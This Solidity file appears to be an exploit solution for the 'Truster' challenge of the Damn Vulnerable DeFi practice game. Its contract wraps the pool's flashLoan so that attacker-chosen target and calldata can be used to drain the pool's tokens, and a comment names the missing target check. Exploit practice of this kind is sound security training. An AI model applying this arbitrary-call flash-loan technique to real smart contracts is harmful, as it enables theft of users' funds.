// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {TrusterLenderPool} from "./TrusterLenderPool.sol";
import {DamnValuableToken} from "../DamnValuableToken.sol";
import "solady/src/utils/SafeTransferLib.sol";

contract AttackTrusterLenderPool {
    TrusterLenderPool pool;
    DamnValuableToken public immutable damnValuableToken;

    constructor(address _pool, address tokenAddress) {
        pool = TrusterLenderPool(_pool);
        damnValuableToken = DamnValuableToken(tokenAddress);
    }
    // Pool is vulnerable because it does not check if the target not its own token.

    function drainPool(uint256 amount, address borrower, address target, bytes calldata data) external {
        pool.flashLoan(amount, borrower, target, data);
    }
}
